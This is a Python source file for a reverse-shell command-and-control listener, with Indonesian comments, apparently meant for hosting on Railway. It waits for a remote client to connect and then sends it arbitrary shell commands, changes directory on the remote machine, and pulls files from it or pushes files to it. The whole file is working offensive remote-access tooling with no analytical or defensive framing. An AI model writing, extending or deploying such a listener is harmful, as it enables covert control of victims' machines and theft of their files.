#!/usr/bin/env python3
import socket
import json
import os
import base64
import platform
import sys
import time
import logging
import traceback

# Setup logging for Railway
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger('Server')

class Listener:
    def __init__(self, ip, port):
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((ip, port))
        self.listener.listen(0)
        self.listener.settimeout(None)
        logger.info(f"[+] Waiting for incoming connections on {ip}:{port}")
        self.connection = None
        self.address = None
        self.BUFFER_SIZE = 1024 * 1024 * 4  # 4MB buffer
        self.client_os = "Unknown"
        self.client_cwd = "/"
        self.accept_connection()

    def accept_connection(self):
        while True:
            try:
                if self.connection:
                    self.connection.close()
                logger.info("[+] Listening for new connection...")
                self.connection, self.address = self.listener.accept()
                self.connection.settimeout(3600)
                logger.info(f"[+] Connection from {self.address[0]}:{self.address[1]}")
                self.init_client_info()
                break
            except socket.timeout:
                logger.warning("[!] Accept timed out, retrying...")
                continue
            except Exception as e:
                logger.error(f"[!] Error accepting connection: {str(e)}")
                time.sleep(1)

    def init_client_info(self):
        try:
            init_data = self.reliable_receive()
            if init_data is None:
                logger.error("[-] Connection closed before initial data received")
                self.accept_connection()
                return

            if isinstance(init_data, str):
                try:
                    init_data = json.loads(init_data)
                except:
                    init_data = {"os": "Unknown", "cwd": "/"}

            self.client_os = init_data.get("os", "Unknown")
            self.client_cwd = init_data.get("cwd", "/")
            logger.info(f"Client OS: {self.client_os}")
            logger.info(f"Initial directory: {self.client_cwd}")
        except Exception as e:
            logger.error(f"[-] Initialization error: {str(e)}")

    def reliable_send(self, data):
        try:
            json_data = json.dumps(data)
            self.connection.sendall(json_data.encode('utf-8'))
        except (BrokenPipeError, ConnectionResetError) as e:
            logger.error(f"[!] Send error: {str(e)}")
            self.accept_connection()
            raise

    def reliable_receive(self):
        json_data = b""
        start_time = time.time()
        timeout = 3600

        while True:
            if time.time() > start_time + timeout:
                raise TimeoutError("Receive timed out")

            try:
                chunk = self.connection.recv(4096)
                if not chunk:
                    return None
                json_data += chunk

                try:
                    return json.loads(json_data.decode('utf-8', errors='replace'))
                except json.JSONDecodeError:
                    continue
            except socket.timeout:
                continue
            except (ConnectionResetError, BrokenPipeError) as e:
                logger.error(f"[!] Connection error: {str(e)}")
                self.accept_connection()
                return None
            except Exception as e:
                logger.error(f"[!] Receive error: {str(e)}")
                return None

    def download_file(self, remote_path):
        received = 0
        file_size = 0
        try:
            remote_path = remote_path.strip()
            if remote_path.startswith('"') and remote_path.endswith('"'):
                remote_path = remote_path[1:-1]
            
            self.reliable_send({
                "type": "download",
                "command": remote_path
            })

            response = self.reliable_receive()
            if response is None:
                return "[-] No response from client"

            if isinstance(response, dict) and "error" in response:
                return response["error"]
                
            if not isinstance(response, dict) or "file_size" not in response:
                return f"[-] Invalid response: {response}"

            file_size = response["file_size"]
            file_name = response.get("file_name", os.path.basename(remote_path))

            if file_size == 0:
                save_path = self.get_unique_path(file_name)
                with open(save_path, "wb"):
                    pass
                return f"[+] Downloaded empty file to {save_path}"

            save_path = self.get_unique_path(file_name)
            logger.info(f"[+] Downloading {file_name} ({file_size/1024/1024:.2f} MB) to {save_path}")

            received = 0
            start_time = time.time()
            last_print = start_time
            
            with open(save_path, "wb") as file:
                while received < file_size:
                    remaining = file_size - received
                    chunk_size = min(self.BUFFER_SIZE, remaining)
                    
                    timeout = max(120, file_size / (1024 * 1024) * 5)
                    self.connection.settimeout(timeout)
                    
                    chunk = self.connection.recv(chunk_size)
                    if not chunk:
                        break
                        
                    file.write(chunk)
                    received += len(chunk)
                    
                    current_time = time.time()
                    if current_time - last_print > 1.0:
                        progress = received / file_size * 100
                        mb_received = received / (1024 * 1024)
                        speed = mb_received / (current_time - start_time)
                        logger.info(f"\r[+] Downloaded: {progress:.1f}% ({mb_received:.2f} MB) - Speed: {speed:.2f} MB/s")
                        last_print = current_time

            logger.info("")
            self.connection.settimeout(3600)

            if received == file_size:
                total_time = time.time() - start_time
                speed = (file_size / (1024 * 1024)) / total_time
                return f"[+] Download complete! {file_size/1024/1024:.2f} MB in {total_time:.1f}s ({speed:.2f} MB/s)"
            else:
                return f"[-] Download incomplete. Received {received}/{file_size} bytes"
        except socket.timeout:
            return f"[-] Download timed out. Received {received}/{file_size} bytes"
        except Exception as e:
            return f"[-] Download failed: {str(e)}"
        finally:
            self.connection.settimeout(3600)

    def upload_file(self, local_path):
        try:
            if not os.path.exists(local_path):
                return f"[-] Local file not found: {local_path}"

            file_name = os.path.basename(local_path)
            file_size = os.path.getsize(local_path)

            self.reliable_send({
                "type": "upload",
                "file_name": file_name,
                "size": file_size
            })

            if file_size == 0:
                logger.info("[+] Uploading empty file")
                response = self.reliable_receive()
                return response if response else "[-] No upload confirmation received"

            logger.info(f"[+] Uploading {file_name} ({file_size/1024/1024:.2f} MB)...")
            sent = 0
            start_time = time.time()
            last_print = start_time
            
            with open(local_path, "rb") as file:
                while sent < file_size:
                    chunk = file.read(self.BUFFER_SIZE)
                    if not chunk:
                        break

                    try:
                        self.connection.sendall(chunk)
                    except (BrokenPipeError, ConnectionResetError):
                        return "[-] Connection lost during upload"

                    sent += len(chunk)
                    
                    current_time = time.time()
                    if current_time - last_print > 1.0:
                        progress = sent / file_size * 100
                        mb_sent = sent / (1024 * 1024)
                        speed = mb_sent / (current_time - start_time)
                        logger.info(f"\r[+] Progress: {progress:.1f}% ({mb_sent:.2f} MB) - Speed: {speed:.2f} MB/s")
                        last_print = current_time

            logger.info("")

            response = self.reliable_receive()
            total_time = time.time() - start_time
            speed = (file_size / (1024 * 1024)) / total_time
            
            if response:
                return response + f" in {total_time:.1f}s ({speed:.2f} MB/s)"
            else:
                return f"[-] No upload confirmation received. Sent {sent}/{file_size} bytes"
        except Exception as e:
            return f"[-] Upload failed: {str(e)}"

    def get_unique_path(self, filename):
        counter = 1
        base, ext = os.path.splitext(filename)
        new_path = filename
        while os.path.exists(new_path):
            new_path = f"{base}_{counter}{ext}"
            counter += 1
        return os.path.abspath(new_path)

    def run(self):
        try:
            while True:
                try:
                    # Warna ANSI
                    CYAN = "\033[36m"
                    YELLOW = "\033[33m"
                    RESET = "\033[0m"

                    if self.client_os == "Windows":
                        prompt = f"{CYAN}{self.client_cwd}>{RESET} "
                    else:
                        prompt = f"{CYAN}{self.client_cwd}${RESET} "

                    command = input(prompt).strip()
                    if not command:
                        continue

                    if command.lower() == "exit":
                        self.reliable_send({"command": "exit", "type": "exec"})
                        print("[-] Closing connection")
                        break

                    if command.lower().startswith("cd "):
                        path = command[3:].strip()
                        self.reliable_send({
                            "command": path,
                            "type": "cd"
                        })
                        response = self.reliable_receive()
                        if response:
                            try:
                                response_data = json.loads(response)
                                self.client_cwd = response_data.get("cwd", self.client_cwd)
                                print(response_data.get("result", ""))
                            except:
                                print(response)
                        continue

                    if command.lower().startswith("download "):
                        remote_file = command[9:].strip()
                        if not remote_file:
                            print("Usage: download <remote_file>")
                            continue
                        print(self.download_file(remote_file))
                        continue

                    if command.lower().startswith("upload "):
                        local_file = command[7:].strip()
                        if not local_file:
                            print("Usage: upload <local_file>")
                            continue
                        print(self.upload_file(local_file))
                        continue

                    self.reliable_send({
                        "command": command,
                        "type": "exec"
                    })

                    result = self.reliable_receive()
                    if result is None:
                        print("[-] Connection closed by client")
                        self.accept_connection()
                        continue

                    if isinstance(result, str):
                        try:
                            decoded = base64.b64decode(result)
                            try:
                                output = decoded.decode('utf-8', errors='replace')
                                print(output)
                            except UnicodeDecodeError:
                                with open("output.bin", "wb") as f:
                                    f.write(decoded)
                                print(f"{YELLOW}[+] Binary output saved to output.bin{RESET}")
                        except:
                            print(result)
                    else:
                        print(result)

                except (BrokenPipeError, ConnectionResetError):
                    print("[-] Connection lost, reconnecting...")
                    self.accept_connection()

        except KeyboardInterrupt:
            print("\n[!] Keyboard interrupt - closing connection")
        except Exception as e:
            print(f"[!] Error: {str(e)}")
        finally:
            if self.connection:
                self.connection.close()
            self.listener.close()
            print("[-] Listener closed")

if __name__ == '__main__':
    # Bind ke semua interface
    HOST_IP = "0.0.0.0"
    
    # Gunakan PORT dari environment variable Railway
    HOST_PORT = int(os.getenv('PORT', '5555'))
    
    # Untuk Railway, kita perlu menjalankan server secara langsung
    logger.info(f"[*] Starting listener on {HOST_IP}:{HOST_PORT}")
    listener = Listener(HOST_IP, HOST_PORT)
    listener.run()
